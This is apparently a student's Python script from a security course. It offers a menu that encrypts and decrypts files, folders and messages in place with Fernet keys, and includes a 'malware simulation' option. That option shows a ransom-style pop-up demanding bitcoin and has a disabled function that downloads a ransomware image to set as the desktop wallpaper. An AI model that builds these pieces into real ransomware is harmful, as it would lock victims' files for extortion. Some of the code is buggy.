#!/usr/bin/env python3

# Author - Jeremy Burks
# Date Last Revised - 07/21/22
# Purpose - Provides a menu and takes user input---encrypts and decrypts a file, recursively encrypts and decrypts folders, and encrypts and decrypts a message depending on user selection 

# import required module
from cryptography.fernet import Fernet
import pyautogui
from pathlib import Path
import os
import sys
import urllib.request 
import ctypes

#Variable usedf to store the key to encrypt strings
stringKey = Fernet.generate_key()
fernet = Fernet(stringKey)

#Menu function with 
def get_cryptic():
    prompt =  """
                **************************************
                **     Please choose an option:      **
                **      1 = Ecrypt a file              **
                **      2 = Decrypt a file              **
                **      3 = Encrypt a message             **
                **      4 = Decrypt a message              ******
                **      5 = Recursive Folder encrypt      **
                **      6 = Recursive Folder decrypt    **
                **      7 = Malware simulation!       **
                **      q = Quit                     **
                **************************************
        ########################################################
                Please enter a number 1 through 7 OR q
        ########################################################
    """ 
    #calling the menu and storing the user response as the variable "prompt"
    prompt = input(prompt)
    #if the user input is 1
    if prompt == str(1):
        # Making a variable called file to store which filepath the user wants encrypted
        file = input("please enter a file path for encryption: ")
        #this checks if the filepath actually exists
        path_exists = Path(file)
        #if the file exists call the encryptFile function, once that's done, pull up the menu again
        if os.path.isdir(file): 
            encryptfolder(file)
            get_cryptic()
        elif os.path.isfile(path_exists):
            encryptFile(file)
        else:
            print("please enter valid file path: ")
            get_cryptic()
    elif prompt == str(2):
        file = input("please enter a file path for decryption: ")
        path_exists = Path(file)
        if os.path.isdir(file): 
            decryptfolder(file)
            get_cryptic()
        elif os.path.isfile(path_exists):
            decryptFile(file)
            get_cryptic()
        else:
            print("please enter valid file path: ")
            get_cryptic()
    elif prompt == str(3):
        secrets = str(input("please enter a message for encryption: "))
        encryptString(secrets, fernet)
        get_cryptic()
    elif prompt == str(4):
        secrets = str(input("please enter a message for decryption:"))
        decryptString(fernet)
        get_cryptic()
    elif prompt == str(5):
        secrets = str(input("please enter a file path for recursive folder encryption: "))
        encryptfolder(secrets)
    elif prompt == str(6):
        secrets = str(input("please enter a file path for recursive folder decryption: "))
        decryptfolder(secrets)
    elif prompt == str(7):
        #change_desktop_background(self)
        pyautogui.alert('YOU HAVE BEEN HACKED. YOUR IMPORTANT FILES HAVE BEEN ENCRYPTED. SELECT OK TO CONTINUE TO BITCOIN PAYMENT PAGE WITH FURTHER INSTRUCTIONS TO DECRYPT YOUR FILES', "!!!WARNING!!!")
        get_cryptic()
    elif prompt == 'q' or prompt.lower == 'quit':
        sys.exit(0)
    else:
        print("please enter a valid response")
        get_cryptic()    

#######encrypt file function below

def encryptFile(file):
    master_key = Fernet.generate_key()
    filename = os.path.basename(file)
    uniquekey = "/Users/jeremyburks/Ops401-Challenges/" + filename + ".key"
    with open(uniquekey, 'wb') as filekey:
        filekey.write(master_key)
    f = Fernet(master_key)
    with open(file, "rb") as fileread:
        readfile = fileread.read()
    encryptFile = f.encrypt(readfile)
    with open(file, "wb") as filewrite:
        filewrite.write(encryptFile)
    print("files encrypted")
    get_cryptic()

########### Decrypt file funtion below

def decryptFile(file):   
    filename = os.path.basename(file)
    unlockkey = "/Users/jeremyburks/Ops401-Challenges/" + filename + ".key"
    with open(unlockkey, 'rb') as filekey:
        master_key = filekey.read() 
  
    fernet = Fernet(master_key)
    
    with open(file, 'rb') as enc_file:
        encrypted = enc_file.read()
    decrypted = fernet.decrypt(encrypted)
    with open(file, 'wb') as dec_file:
        dec_file.write(decrypted)
    print("files decrypted")

########### encrypt string function below

def encryptString(message, fernet):
    encMessage = fernet.encrypt(message.encode())
    print("original string: ", message)
    print("encrypted string: ", encMessage)
    with open("secrets.txt", "wb") as f:
        f.write(encMessage)
    return encMessage

######## decrypt string function below

def decryptString(fernet):
    with open("secrets.txt", "rb") as f:
        message = f.read()
    decMessage = fernet.decrypt(message).decode()
    print("decrypted string: ", decMessage)
    get_cryptic()

####### recursive folder encryption function below

def encryptfolder(file):
    master_key = Fernet.generate_key()
    if os.path.isdir(file): 
        for item in os.listdir(file):
            uniquekey = "/Users/jeremyburks/Ops401-Challenges/" + item + ".key"
            filename = os.path.basename(item)
            fullpath = file + "/" + item
            with open(uniquekey, 'wb') as filekey:
                filekey.write(master_key)
            f = Fernet(master_key)
            with open(fullpath, "rb") as fileread:
                readfile = fileread.read()
            encryptFile = f.encrypt(readfile)
            with open(fullpath, "wb") as filewrite:
                filewrite.write(encryptFile)
            print("files encrypted")
        get_cryptic()

########## Recursive folder decryption function below

def decryptfolder(thePath):
    for file in os.listdir(thePath):
        filename = os.path.basename(file)
        fullpath = thePath + "/" + file
        unlockkey = "/Users/jeremyburks/Ops401-Challenges/" + filename + ".key"
        with open(unlockkey, 'rb') as filekey:
            master_key = filekey.read() 
    
        fernet = Fernet(master_key)
        
        with open(fullpath, 'rb') as enc_file:
            encrypted = enc_file.read()
        decrypted = fernet.decrypt(encrypted)
        with open(fullpath, 'wb') as dec_file:
            dec_file.write(decrypted)
        print("files decrypted")

####### Malware simulation below---changes dektop wallpaper 

def change_desktop_background(self):
    imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        # Go to specif url and download+save image using absolute path
    path = f'{self.sysRoot}Desktop/background.jpg'
    urllib.request.urlretrieve(imageUrl, path)
    SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


get_cryptic()
